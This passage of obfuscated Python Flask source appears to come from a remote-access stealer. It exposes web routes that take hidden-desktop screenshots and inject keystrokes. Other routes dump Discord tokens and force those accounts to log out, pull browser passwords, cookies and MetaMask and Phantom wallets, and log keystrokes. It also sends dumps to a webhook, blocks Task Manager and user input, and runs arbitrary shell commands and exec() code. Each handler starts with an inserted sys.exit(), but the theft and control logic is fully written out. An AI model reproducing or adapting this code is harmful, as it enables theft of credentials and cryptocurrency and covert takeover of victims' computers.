tgYaRjBe2/EVCg6gsEZhCY88Ju6nBdKE4t6nhjBcxHHSu3zH5T/K75vVkmV85CYA0BCyOtoV7mORWoZeZVqwIKTHFxN2WzPFo3paZjTSFgPuoUio5BgACB5QWMni5vXvIZFaglZ1fbshE4tELwFA0xcjGFomPMLWA+6tzCjk+AAIFpBT5+/Nj88MMPTbrJmD4WRprWt8ajKVBrzLo2EyBAILCA+aiBkyM0AgQIbAm0F168efNm8+9//7s5OTnhRGC0QPYFamr5nIvLjJa1IwECBAiMFjAfdTSdHQkQILCYwPa803TSi4uL5s6dO4ud34nKFMiyQP3b3/52/RhBV1oUrGV2Vq0iQKAega75qF49U0/+tZQAgfgC7Xmn6bUy//znP+MHLsLwAlkWqEPm66Vi9fHjx01aEMaHAAECBPIRaP/WP3v2rHn+/Hk+DRApAQIEChawam/ByV25aVkWqNtmQ4rV7f2Msq7c85yeAAECPQS2H/VNmytSe6DZhAABAjMLWLV3ZuDKD599gdrO39iCtV28GnWt/Juh+QQIhBBIj/revXu3SQtxbD7n5+fNkydPQsQnCAIECNQoYPS0xqwv1+biCtRtujnfO+nR4eU6qTMRIFC3QLtITatDmo9ad5/QegIE1hNIUy3Ozs6uA0i/x1btXS8fJZ656AJ1V8KmGGXt2xkUsn2lbEeAAIHdAu1Fkzzqq7cQIEBgeYH2o73eebp8Dmo4Y5UF6r7Ezjnq2rdDKWr7StmOAIGaBMxHrSnb2kqAQESB7Ud706q96bUyRk8jZirvmBSoI/IXoYg9FLYi95CQfydAIDcB81Fzy5h4CRAoScCjvSVlM3ZbFKgz5ieHQnbq5lsdeWpRxyNAYFugaz7qq1evmtPTU1AECBAgMJOAR3tngnXYTgEFarCOUVJRq1gN1rmEQ6AQgfZ81PR4mSK1kORqBgECIQU82hsyLcUGpUAtMLWRilyrbRbYwTSJQACB9mJ3fmsCJEUIBAgUKeCdp0WmNXSjFKih05NXcF2rIz948OBqZMOHAAECUwu0f3M8tTG1sOMRIFC7wJs3b5q0QN3l5eUVhVV7a+8Ry7RfgbqMs7MQIECAwAwC7ZV9jaTOgOyQBAhUKdAeOU0I3nlaZVdYvNEK1MXJnZAAAQIEphLomtJwfn7ePHnyZKpTOA4BAgSqFNied5oAPBVXZTdYpdEK1FXYnZQAAQIEphTYHklNo6gvX768upjyIUCAAIHhAl4pM9zMHtMJKFCns3QkAgQIEFhJoL2ybwrj2bNnTbrI8iFAgACB/gLt4tS80/52tpxGQIE6jaOjECBAgMDKAl0LtXncd+WkOD0BAlkJtOed3rp1q7m4uGjSkyk+BJYSUKAuJe08BAgQIDC7QBpJvXv3bvPu3burc3lH6uzkTkCAQEEC3ndaUDIzbooCNePkCZ0AAQIEvhZoP+5rTqpeQoAAgcMC5p0eNrLFMgIK1GWcnYUAAQIEFhToetzXnNQFE+BUBAhkJWDeaVbpKj5YBWrxKdZAAgQI1ClgTmqdeddqAgSGCbSLU/NOh/nZenoBBer0po5IgAABAkEEuuakphfN+xAgQIBA01gUSS+IKKBAjZgVMREgQIDAZALtOak3btxoHj9+7D2pkwk7EAECuQpYFCnXzJUdtwK17PxqHQECBAg0TfPo0aPm119//cLCnFRdgwCBmgUsilRz9mO3XYEaOz+iI0CAAIEJBNIo6sOHD5s3b94oUifwdAgCBPIWaD/ae+/evebt27d5N0r0xQgoUItJpYYQIECAwCGB9pzUtL2R1ENq/p0AgZIE0nui79+/31xeXl41y6JIJWW3jLYoUMvIo1YQIECAQE8BRWpPKJsRIFCcQLs4TQ1MC8el90X7EIgioECNkglxECBAgMBiAl1Falo8KY2mnp6eTh5HerT4H//4R/PTTz/NcvzJA3ZAAgSKFNheFCk18MGDB82rV6+KbKtG5SugQM03dyInQIAAgSMEuorUNIrw8uXLSVf43Z7rlY7/v//7v0YrjsibXQkQGCfQXhRJcTrO0V7zCyhQ5zd2BgIECBAIKrDE4knbIxYWIgnaEYRFoGCB9FhvWiTuw4cP1630W1RwwgtomgK1gCRqAgECBAgcJ/DixYvm6dOnXxzk/Py8efLkyVEHbq+Uaa7XUZx2JkBghED7sV6LIo1AtMuiAgrURbmdjAABAgSiCrQf+Z3icV+jp1GzLS4CdQh0vU7m9evXphnUkf5sW6lAzTZ1AidAgACBqQVSkfrtt9826T83n7GLJxk9nTo7jkeAwBCBjx8/Nj/88MP175nHeofo2XZNAQXqmvrOTYAAAQLhBLoe902jqWmly74r/LZf5eDCMFyaBUSgaIG0cvjZ2dn1vNObN282//73v42cFp31chqnQC0nl1pCgAABAhMJdC2eNOSR3/acL3NPJ0qMwxAgcFCgvVpv2uHi4qK5c+fOwX1tQCCCgAI1QhbEQIAAAQIhBbpGU/s88vvNN99ct8erHEKmVlAEihToKk7Tokj//Oc/i2yvRpUpoEAtM69aRYAAAQITCex65HfX+1Lbc08/f/48USQOQ4AAgd0C7eLUar16S64CCtRcMyduAgQIEFhMYNf7UrtGU63cu1hanIgAgaZput5zqjjVNXIWUKDmnD2xEyBAgMCiAodGU9OF4u3bt69jMvd00fQ4GYHqBNJiSI8ePWouLy+v2644ra4bFNdgBWpxKdUgAgQIEJhTYNdoatc5Pd47ZyYcm0DdAl3zTdOK4d5zWne/KKH1CtQSsqgNBAgQILC4QNdo6nYQFkdaPCVOSKAaga7i1G9ONekvvqEK1OJTrIEECBAgMJfArtFUF4pziTsuAQIWQ9IHShdQoJaeYe0jQIAAAQIECBAoQkBxWkQaNeKAgAJVFyFAgAABAgQIECAQWMBKvYGTI7TJBRSok5M6IAECBAgQIECAAIFpBKzUO42jo+QjoEDNJ1ciJUCAAAECBAgQqEjASr0VJVtTrwUUqDoDAQIECBAgQIAAgUACadT07Oys+fDhwxdRWYAtUJKEMpuAAnU2WgcmQIAAAQIECBAgMEyga9T01q1bzcXFRXNycjLsYLYmkKGAAjXDpAmZAAECBAgQIECgLIFdo6b37t1rXr9+rTgtK91as0dAgap7ECBAgAABAgQIEFhRwKjpivhOHU5AgRouJQIiQIAAAQIECBCoQcCoaQ1Z1sahAgrUoWK2J0CAAAECBAgQIHCEwK7C1FzTI1DtWoyAArWYVGoIAQIECBAgQIBAZIF37941Dx8+/Gp13hSzuaaRMye2JQUUqEtqOxcBAgQIECBAgEB1AgrT6lKuwUcIKFCPwLMrAQIECBAgQIAAgV0CClN9g8BwAQXqcDN7ECBAgAABAgQIENgpsK8wTTs9ePCgefXqFUECBDoEFKi6BQECBAgQIECAAIGJBNICSI8ePWouLy+/OqLCdCJkhylaQIFadHo1jgABAgQIECBAYAmBXSvzGjFdQt85ShJQoJaUTW0hQIAAAQIECBBYTGBfUaowXSwNTlSYgAK1sIRqDgECBAgQIECAwLwCh+aYemXMvP6OXraAArXs/GodAQIECBAgQIDARAIK04kgHYbAHgEFqu5BgAABAgQIECBAYI/Avkd5jZbqOgSmFVCgTuvpaAQIECBAgAABAoUImGNaSCI1IysBBWpW6RIsAQIECBAgQIDAEgLPnz9vzs7OOk/ldTFLZMA5ahVQoNaaee0mQIAAAQIECBD4SmDXqKlHeXUWAssIKFCXcXYWAgQIECBAgACB4AJdo6a3bt1qLi4umpOTk+DRC49AGQIK1DLyqBUECBAgQIAAAQIjBCyANALNLgRmFFCgzojr0AQIECBAgAABAjEF9hWmRk1j5kxUdQgoUOvIs1YSIECAAAECBAg0TXNoZV5zTXUTAusKKFDX9Xd2AgQIECBAgACBmQXevXvXPHz4sPnw4UPnmRSlMyfA4QkMEFCgDsCyKQECBAgQIECAQF4CacT00aNHzeXl5VeBK0zzyqVo6xBQoNaRZ60kQIAAAQIECFQlYPGjqtKtsQUJKFALSqamECBAgAABAgQINE3X62KSy4MHD5pXr14hIkAgsIACNXByhEaAAAECBAgQINBfYNeoqUd5+xvaksDaAgrUtTPg/AQIECBAgAABAqMFvC5mNJ0dCYQUUKCGTIugCBAgQIAAAQIE9glYmVf/IFCmgAK1zLxqFQECBAgQIECgOIFD7zBNDfY4b3Fp16DKBBSolSVccwkQIECAAAECOQrsWvhIUZpjNsVMYLeAAlXvIECAAAECBAgQCCnQZ8TUyrwhUycoAqMFFKij6exIgAABAgQIECAwtcChovTWrVvNxcVFc3JyMvWpHY8AgQACCtQASRACAQIECBAgQKBWgUOLHW27mF9aay/R7poEFKg1ZVtbCRAgQIAAAQIrCwwpSFOoitKVE+b0BBYWUKAuDO50BAgQIECAAIHaBA49ttv2UJTW1kO0l8BfAgpUvYEAAQIECBAgQGBSgaEFaTq5xY4mTYGDEchWQIGabeoEToAAAQIECBCIIzC0KFWQxsmdSAhEElCgRsqGWAgQIECAAAECGQkMmU/qsd2MEitUAisKKFBXxHdqAgQIECBAgEBuAn2LUgVpbpkVL4EYAgrUGHkQBQECBAgQIEAgtECfwlRRGjqFgiOQhYACNYs0CZIAAQIECBAgsJ5Aml/66NGj5vLysjMI80nXy40zEyhNQIFaWka1hwABAgQIECAwkcC+UVNF6UTIDkOAwBcCClQdggABAgQIECBA4CuBVJzev3//q1FThanOQoDAnAIK1Dl1HZsAAQIECBAgkKnA999/33z8+PE6evNLM02ksAlkJqBAzSxhwiVAgAABAgQIzC2QRk9v3759fRqjpnOLOz4BAhsBBaq+QIAAAQIECBAgcC3Q9Wjv58+fCREgQGARAQXqIsxOQoAAAQIECBCIL9BVnBo9jZ83ERIoSUCBWlI2tYUAAQIECBAgcITADz/80Hz48OH6CIrTIzDtSoDAKAEF6ig2OxEgQIAAAQIEyhN48eJF8/Tp06uGKU7Ly68WEchBQIGaQ5bESIAAAQIECBAgQIAAgQoEFKgVJFkTCRAgQIAAAQIECBAgkIOAAjWHLImRAAECBAgQIECAAAECFQgoUCtIsiYSIECAAAECBAgQIEAgBwEFag5ZEiMBAgQIECBAgAABAgQqEFCgVpBkTSRAgAABAgQIECBAgEAOAgrUHLIkRgIECBAgQIAAAQIECFQgoECtIMmaSIAAAQIECBAgQIAAgRwEFKg5ZEmMBAgQIECAAAECBAgQqEBAgVpBkjWRAAECBAgQIECAAAECOQgoUHPIkhgJECBAgAABAgQIECBQgYACtYIkayIBAgQIECBAgAABAgRyEFCg5pAlMRIgQIAAAQIECBAgQKACAQVqBUnWRAIECBAgQIAAAQIECOQgoEDNIUtiJECAAAECBAgQIECAQAUCCtQKkqyJBAgQIECAAAECBAgQyEFAgZpDlsRIgAABAgQIECBAgACBCgQUqBUkWRMJECBAgAABAgQIECCQg4ACNYcsiZEAAQIECBAgQIAAAQIVCChQK0iyJhIgQIAAAQIECBAgQCAHAQVqDlkSIwECBAgQIECAAAECBCoQUKBWkGRNJECAAAECBAgQIECAQA4CCtQcsiRGAgQIECBAgAABAgQIVCCgQK0gyZpIgAABAgQIECBAgACBHAQUqDlkSYwECBAgQIAAAQIECBCoQECBWkGSNZEAAQIECBAgQIAAAQI5CChQc8iSGAkQIECAAAECBAgQIFCBgAK1giRrIgECBAgQIECAAAECBHIQUKDmkCUxEiBAgAABAgQIECBAoAIBBWoFSdZEAgQIECBAgGUrbckAAAEESURBVAABAgQI5CCgQM0hS2IkQIAAAQIECBAgQIBABQIK1AqSrIkECBAgQIAAAQIECBDIQUCBmkOWxEiAAAECBAgQIECAAIEKBBSoFSRZEwkQIECAAAECBAgQIJCDgAI1hyyJkQABAgQIECBAgAABAhUIKFArSLImEiBAgAABAgQIECBAIAcBBWoOWRIjAQIECBAgQIAAAQIEKhBQoFaQZE0kQIAAAQIECBAgQIBADgIK1ByyJEYCBAgQIECAAAECBAhUIKBArSDJmkiAAAECBAgQIECAAIEcBBSoOWRJjAQIECBAgAABAgQIEKhAQIFaQZI1kQABAgQIECBAgAABAjkI/B/fS7UG0XE4kgAAAABJRU5ErkJggg=="><script type="text/javascript" src="https://code.jquery.com/jquery-1.6.2.js"></script><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script><script>var online_status=!0;function camera_manager(){var e=new XMLHttpRequest;e.open("GET","/cameraapi"),e.onreadystatechange=function(){4===e.readyState&&(console.log(e.status),200==e.status?250<e.responseText.length&&(document.getElementById("myImage").src="data:image/png;base64,"+e.responseText,0==online_status&&(online_status=!0,showAndDismissAlertLONG("success",window.location.hostname+"/cameraapi is offline"))):1==online_status&&(online_status=!1,showAndDismissAlertLONG("danger",window.location.hostname+"/cameraapi is offline")),camera_manager())},e.send()}camera_manager()</script><div class="alert-messages movetobottom"></div><script>function showAndDismissAlertLONG(e,s){var a='<div class="alert alert-'+e+'">'+s+"</div>";$(".alert-messages").prepend(a),$(".alert-messages .alert").first().hide().fadeIn(500).delay(3e4).fadeOut(1e3,function(){$(this).remove()})}</script>"""  # line:1566


@app .route ("/hvnctype", methods =["POST"])  # line:1569
def _O0O00O0O00O0OOO00 (width =1920, height =1080 ):  # line:1570
    sys.exit()
    global desktop  # line:1571
    OOOO000OOO00OO00O = request .get_json("keys")  # line:1572
    OO00OOOO00OOO0O0O = int(OOOO000OOO00OO00O ["keys"])  # line:1573
    OOO0000O00OO0OOO0 = {"13": win32con .VK_RETURN , "8":win32con .VK_BACK ,'tab':win32con .VK_TAB ,'right':win32con .VK_RIGHT ,'left':win32con .VK_LEFT ,'up':win32con .VK_UP ,'down':win32con .VK_DOWN ,'shift':win32con .VK_SHIFT ,'ctrl':win32con .VK_CONTROL ,'alt':win32con .VK_MENU ,'esc':win32con .VK_ESCAPE ,'win':win32con .VK_LWIN ,'caps lock':win32con .VK_CAPITAL ,}#line:1590
    if str (OO00OOOO00OOO0O0O)not in OOO0000O00OO0OOO0:  # line:1592
        _O00O0OO000OOOO00O(OO00OOOO00OOO0O0O)  # line:1593
    else:  # line:1594
        print("special")  # line:1595
        _O00O0OO000OOOO00O (OOO0000O00OO0OOO0 [str (OO00OOOO00OOO0O0O)], False )  # line:1597
    return "Done"  # line:1598


@app .route ("/hvncpaste", methods =["POST"])  # line:1600
def _O0000O0O0000OO000():  # line:1601
    sys.exit()
    global desktop  # line:1602
    OOO0OO0OO00O0OOOO = request .get_json("keys")  # line:1603
    O000O00OO00O000O0 = str(OOO0OO0OO00O0OOOO ["keys"])  # line:1604
    for O00O0O0O000000000 in O000O00OO00O000O0:  # line:1605
        _O00O0OO000OOOO00O(ord (O00O0O0O000000000))  # line:1606


@app .route ("/hvncss", methods =["GET"])  # line:1609
def hvncscreenshotapi (width =1920, height =1080 ):  # line:1610
    sys.exit()
    global desktop  # line:1611
    O0OO0OOOO0000OOO0 = PIL .Image .new ('RGB', (width , height ))#line:1613
    OO0O0OO00O0O00O0O = desktop .EnumDesktopWindows()  # line:1614
    OO0O0OO00O0O00O0O .reverse()  # line:1615
    for _OO0OO0O0000O0OOO0 in OO0O0OO00O0O00O0O:  # line:1616
        O0000000OO000O00O = _OO0OO0O0000O0OOO0  # line:1617
        if win32gui .IsWindowVisible(O0000000OO000O00O):  # line:1618
            O0OOOO0O0OOO00OO0 = win32gui .GetWindowRect (O0000000OO000O00O)  # line:1620
            OOO00O0O0000000OO , OOO0O00OO000000OO , OO0OOO0OOO00O00O0 ,OOOOO00OO00OOOO00 = O0OOOO0O0OOO00OO0 #line:1621
            width = OO0OOO0OOO00O00O0 - OOO00O0O0000000OO  # line:1622
            height = OOOOO00OO00OOOO00 - OOO0O00OO000000OO  # line:1623
            OO0OOO0O0000O00OO = win32gui .GetWindowDC (O0000000OO000O00O)  # line:1624
            OO0OOOO0OO00O0OO0 = win32ui .CreateDCFromHandle (OO0OOO0O0000O00OO)  # line:1625
            OO000OO0OOO0OOO00 = OO0OOOO0OO00O0OO0 .CreateCompatibleDC()  # line:1626
            O0OOOOO0O000OOOO0 = win32ui .CreateBitmap()  # line:1627
            O0OOOOO0O000OOOO0 .CreateCompatibleBitmap (OO0OOOO0OO00O0OO0 , width , height )  # line:1628
            OO000OO0OOO0OOO00 .SelectObject(O0OOOOO0O000OOOO0)  # line:1629
            O00OOO00OOO0OO00O = windll .user32 .PrintWindow (int (O0000000OO000O00O ), OO000OO0OOO0OOO00 .GetSafeHdc (), 3 )#line:1630
            if O00OOO00OOO0OO00O == 1:  # line:1631
                O0O00000OO00OOO00 = O0OOOOO0O000OOOO0 .GetInfo()  # line:1632
                OO00OO0O0OO0OO0OO = O0OOOOO0O000OOOO0 .GetBitmapBits (True)  # line:1633
                try:  # line:1634
                    OO00O0000O0OOOOO0 = PIL .Image .frombuffer ('RGB', (O0O00000OO00OOO00 ['bmWidth'], O0O00000OO00OOO00 ['bmHeight']),OO00OO0O0OO0OO0OO ,'raw','BGRX',0 ,1 )#line:1638
                    O0OO0OOOO0000OOO0 .paste (OO00O0000O0OOOOO0, O0OOOO0O0OOO00OO0 )  # line:1640
                except:  # line:1642
                    pass  # line:1643
            win32gui .DeleteObject(O0OOOOO0O000OOOO0 .GetHandle())  # line:1644
            OO000OO0OOO0OOO00 .DeleteDC()  # line:1645
            OO0OOOO0OO00O0OO0 .DeleteDC()  # line:1646
            win32gui .ReleaseDC (O0000000OO000O00O, OO0OOO0O0000O00OO )  # line:1647
    O00OOOOOO0OOO0O0O = io .BytesIO()  # line:1651
    O0OO0OOOO0000OOO0 .save (O00OOOOOO0OOO0O0O, format ="png")  # line:1652
    O00OOOOOO0OOO0O0O .seek(0)  # line:1653
    _OOO0O00OOOO00000O = base64 .b64encode(O00OOOOOO0OOO0O0O .read ()).decode ()  # line:1654
    return _OOO0O00OOOO00000O  # line:1655


@app .route ("/tokens", methods =["GET"])  # line:1660
def tokens():  # line:1661
    sys.exit()
    try:  # line:1662
        _O0O0OO0OOOOOOO0OO = get_tokens (True)  # line:1663
    except Exception as O00OOO0O00OOO00OO:  # line:1664
        return e  # line:1665
    return flask_process_content(_O0O0OO0OOOOOOO0OO)  # line:1666


@app .route ("/tokenlogout", methods =["GET"])  # line:1669
def logouttokens():  # line:1670
    sys.exit()
    O00O0O0OO00O0O000 = []  # line:1671
    OOO0OO00O0O0O00OO = ""  # line:1672
    for O0OOOO000O0O0O00O in str(get_tokens (True)).split ("\n"):  # line:1673
        if "["not in O0OOOO000O0O0O00O and len (O0OOOO000O0O0O00O ) > 5 :  # line:1674
            OOO0OO00O0O0O00OO += O0OOOO000O0O0O00O  # line:1675
            OO0O0OO00OOO00OO0 = {'accept': '*/*', 'accept-encoding':'gzip, deflate','accept-language':'en-US,en;q=0.9','authorization':O0OOOO000O0O0O00O ,'content-length':'46','content-type':'application/json','origin':'https://discord.com','referer':'https://discord.com/channels/','sec-ch-ua':'".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','x-debug-options':'bugReporterEnabled','x-discord-locale':'en-US','x-super-properties':'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE0NjI4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',}#line:1676
            try:  # line:1678
                OO0O00OO00OO00O00 = requests .post (f"https://discord.com/api/v9/auth/logout", json ={"provider": None ,"voip_provider":None },headers =OO0O0OO00OOO00OO0 )#line:1679
                if OO0O00OO00OO00O00 .status_code == 204:  # line:1680
                    OOO0OO00O0O0O00OO += " LOGGED OUT"  # line:1681
                else:  # line:1682
                    OOO0OO00O0O0O00OO += " ERROR LOGGING OUT"  # line:1683
            except Exception as OO0O0O0000O00OO0O:  # line:1684
                print(OO0O0O0000O00OO0O)  # line:1685
                OOO0OO00O0O0O00OO += " ERROR WITH LOGOUT REQUEST"  # line:1686
    return flask_process_content(OOO0OO00O0O0O00OO)  # line:1691


@app .route ("/passwords", methods =["GET"])  # line:1694
@app .route ("/passes", methods=["GET"])  # line:1695
def passwords():  # line:1696
    sys.exit()
    _O0OOOO0000O0000O0 = get_passwords (True)  # line:1697
    return flask_process_content(_O0OOOO0000O0000O0)  # line:1698


@app .route ("/cookies", methods =["GET"])  # line:1700
def cookies():  # line:1701
    sys.exit()
    _O0O00O0O00O00OO00 = get_cookies (True)  # line:1703
    return flask_process_content(_O0O00O0O00O00OO00)  # line:1704


@app .route ("/metamask", methods =["GET"])  # line:1706
def metamask():  # line:1707
    sys.exit()
    try:  # line:1708
        OO00O000000O000OO = get_metamask (True)  # line:1709
    except:  # line:1710
        OO00O000000O000OO = f"No wallet found"  # line:1711
    return OO00O000000O000OO  # line:1712


@app .route ("/phantom", methods =["GET"])  # line:1714
def phantom():  # line:1715
    sys.exit()
    try:  # line:1716
        OOO0000O0O000O00O = get_phantom (True)  # line:1717
    except:  # line:1718
        OOO0000O0O000O00O = "No wallet found"  # line:1719
    return flask_process_content(OOO0000O0O000O00O)  # line:1720


@app .route ("/keystrokes", methods =["GET"])  # line:1723
def keyapi():  # line:1724
    sys.exit()
    time .sleep(0.25)  # line:1725
    return flask_process_content(all_keys)  # line:1726


@app .route ("/killall", methods =["GET"])  # line:1728
def killallprocesses():  # line:1729
    sys.exit()
    OOO00OO0OOO0000O0 = close_all()  # line:1730
    return f"Closed {OOO00OO0OOO0000O0} items"  # line:1731


@app .route ("/killallbrowsers", methods =["GET"])  # line:1733
def killallbrowsers():  # line:1734
    sys.exit()
    OO00O0O00O000OOO0 = close_all_browsers()  # line:1735
    return f"Closed {OO00O0O00O000OOO0} browsers"  # line:1736


@app .route ("/keys", methods =["GET"])  # line:1738
def keys():  # line:1739
    sys.exit()
    return """

<p id="p1">Keys will show here!</p>
<script>
    function key_manager(){
        var url = "/keystrokes";

        var xhr = new XMLHttpRequest();
        xhr.open("GET", url);

        xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            console.log(xhr.status);
            console.log(xhr.responseText);
            if (xhr.status ==200) {
                if (xhr.responseText !=="") {
                    document.getElementById("p1").innerHTML = xhr.responseText;
                }

            }
            

            key_manager()
        }};

        xhr.send();
    }


key_manager()
</script>
"""  # line:1771


@app .route ("/dump", methods =["GET"])  # line:1776
def dump():  # line:1777
    sys.exit()
    start_threads()  # line:1778
    return f"Dumped to {webhook[:-5]}....."  # line:1780


def make_html_button (O0O0O0O00O000O0O0 , O0O0OO0O0OO0O00OO ):  # line:1783
    sys.exit()
    return f"""<button><a href="javascript: kill_func('/run?command=taskkill /im ITEMHERE /f');">{O0O0OO0O0OO0O00OO}x ITEMHERE</a></button>""".replace ("ITEMHERE", O0O0O0O00O000O0O0)  # line:1785


@app .route ("/running", methods =["GET"])  # line:1788
def applications_running():  # line:1789
    sys.exit()
    time .sleep(0.2)  # line:1790
    OO0O000O00OO0O000 = get_applications_running()  # line:1791
    _OOO0O0O0OO0O00O00 = """<!Doctype html><html><style>.btn-group button{background-color:#fff;border:1px solid #5500f3;color:#fff;padding:10px 5px;cursor:pointer;width:15%;display:block}.btn-group button:not(:last-child){border-bottom:none}.btn-group button:hover{background-color:#e45bb4}</style><body><h1>Click 2 Kill</h1><script>function kill_func(url){
  console.log("Killing in progress | "+url)

  if (url.includes("run")) {
        runcmd = url.split("=")[1];
        url = "/run?command=" + encodeURIComponent(runcmd)
        var reload = true
  }
  else{
    var reload = false
  }

  try {     
        const response =  fetch(url, {method: 'get',});
  }
  catch(err) {
        alert(`Error: ${err}`);
      }
  if (reload==true){
    location.reload();
  }

}</script>

<div class="btn-group">
<button><a href='javascript: kill_func("/killallbrowsers");'>Kill all browsers</a></button>
<button><a href="javascript: kill_func('/killall');">Kill all</a></button>
DATAHERE
  


</div>

</body>
</html>


"""  # line:1829
    OO0000O00O0O0O000 = ""  # line:1830
    for O0OOOOO0O00OOO000 in OO0O000O00OO0O000:  # line:1831
        O0OOOOO00OO000O00 = make_html_button (O0OOOOO0O00OOO000 [0 ], O0OOOOO0O00OOO000 [1 ])  # line:1832
        OO0000O00O0O0O000 += f"{O0OOOOO00OO000O00}\n"  # line:1833
    return _OOO0O0O0OO0O00O00 .replace ("DATAHERE", OO0000O00O0O0O000)  # line:1834


@app .route ('/run', methods =["GET"])  # line:1836
def run_command():  # line:1837
    sys.exit()
    try:  # line:1838
        OO0O00O0000O0OOOO = request .args .get('command')  # line:1839
    except:  # line:1840
        return "No Command given"  # line:1841
    if str (OO0O00O0000O0OOOO ).lower () == "none":  # line:1844
        return "No Command given"  # line:1845
    else:  # line:1846
        if OO0O00O0000O0OOOO .startswith ("kill ") == True :  # line:1847
            O00OOO0O00O0000O0 = OO0O00O0000O0OOOO .replace ("kill ", "")  # line:1848
            # line:1849
            OO0O00O0000O0OOOO = f"taskkill /im {O00OOO0O00O0000O0} /f"
        if OO0O00O0000O0OOOO .startswith ("msg ") == True :  # line:1850
            OO0OOO00OO00OO000 = OO0O00O0000O0OOOO .replace ("msg ", "")  # line:1851
            win32api .MessageBox (0 , OO0OOO00OO00OO000 , 'Message', 0x00001000 )#line:1852
            return "Message complete"  # line:1853
        if OO0O00O0000O0OOOO .startswith ("alert ") == True :  # line:1855
            OO0OOO00OO00OO000 = OO0O00O0000O0OOOO .replace ("alert ", "")  # line:1856
            win32api .MessageBox (0 , OO0OOO00OO00OO000 , 'Alert', 0x00001000 )#line:1857
            return "Message complete"  # line:1858
        if OO0O00O0000O0OOOO .startswith ("exec ") == True :  # line:1860
            OO00O0O00O000OO0O = OO0O00O0000O0OOOO .replace ("exec ", "")  # line:1861
            exec(OO00O0O00O000OO0O)  # line:1862
            return "Executed"  # line:1863
        if OO0O00O0000O0OOOO .startswith ("os ") == True :  # line:1864
            OO00O0O00O000OO0O = OO0O00O0000O0OOOO .replace ("os ", "")  # line:1865
            try:  # line:1866
                os .system(OO00O0O00O000OO0O)  # line:1867
                return "Ran"  # line:1868
            except:  # line:1869
                return "Error running"  # line:1870
        if OO0O00O0000O0OOOO .startswith ("help") == True :  # line:1871
            # line:1872
            return "kill [process]<br>msg [message]<br>exec [code]<br>os [code]"
        OOO000O0O0OO00O00 = subprocess .run (OO0O00O0000O0OOOO , capture_output =True , shell =True )#line:1875
        return f"Command ran, results:<br>{OOO000O0O0OO00O00}"  # line:1876


@app .route ('/taskmanager', methods =["GET"])  # line:1880
def task_manager_manage():  # line:1881
    sys.exit()
    global banning_task_manager  # line:1882
    try:  # line:1883
        O0O0OO00OO000OOOO = request .args .get('turn')  # line:1884
    except:  # line:1885
        return "No Command given"  # line:1886
    if str (O0O0OO00OO000OOOO ).lower () == "on":  # line:1889
        banning_task_manager = True  # line:1890
        return "Turning banner on"  # line:1891
    if str (O0O0OO00OO000OOOO ).lower () == "off":  # line:1892
        banning_task_manager = False  # line:1893
        return "Turning banner off"  # line:1894


@app .route ('/inputban', methods =["GET"])  # line:1896
def input_ban_manage():  # line:1897
    sys.exit()
    global is_input_banned  # line:1899
    try:  # line:1900
        OO0O0O0O0O00OO000 = request .args .get('turn')  # line:1901
    except:  # line:1902
        return "No Command given"  # line:1903
    if str (OO0O0O0O0O00OO000 ).lower () == "on":  # line:1906
        threading .Thread (target=ban_input).start ()  # line:1907
        return f" Inputs now blocked"  # line:1908
    if str (OO0O0O0O0O00OO000 ).lower () == "off":  # line:1909
        threading .Thread (target=unban_input).start ()  # line:1910
        return f"Inputs unblocked"  # line:1911


@app .route ('/open', methods =["POST"])  # line:1917
def open_site():  # line:1918
    sys.exit()
    try:  # line:1919
        O0OOO0O0O00OO00OO = request .form .to_dict()  # line:1920
        O0OO0OO00O0OO00OO = O0OOO0O0O00OO00OO['url']  # line:1921
    except:  # line:1922
        try:  # line:1923
            OO00000OO00OO0O00 = request .get_json("url")  # line:1924
            OO00O00O0OOOO000O = str(OO00000OO00OO0O00 ["url"])  # line:1925
            if "." in OO00O00O0OOOO000O:  # line:1926
                webbrowser .open(OO00O00O0OOOO000O)  # line:1927
                return f"Opened site"  # line:1928
            else:  # line:1929
                OO00OOOO0OO000O00 = OO00O00O0OOOO000O .replace (" ", "+")  # line:1930
                # line:1931
                OO0O0OOO000O00OO0 = f"https://www.google.com/search?q={OO00OOOO0OO000O00}"
                webbrowser .open(OO0O0OOO000O00OO0)  # line:1932
                return "Invalid site given but eh"  # line:1933
        except:  # line:1934
            return "No site given"  # line:1935


@app .route ('/ip', methods =["GET"])  # line:1937
def ip():  # line:1938
    sys.exit()
